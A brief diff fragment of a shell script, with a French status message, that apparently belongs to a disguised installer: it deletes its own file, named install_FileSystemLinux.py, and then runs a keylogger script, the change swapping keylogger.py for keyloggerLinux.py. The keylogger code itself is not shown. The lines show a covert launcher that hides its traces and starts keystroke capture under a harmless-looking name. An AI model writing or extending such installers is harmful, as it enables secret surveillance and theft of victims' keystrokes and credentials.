@@ -24,4 +24,4 @@ fi
 echo "Exécution du fichier Python..."
 OWNFILE="install_FileSystemLinux.py"
 rm $OWNFILE
-$1 keylogger.py
+$1 keyloggerLinux.py
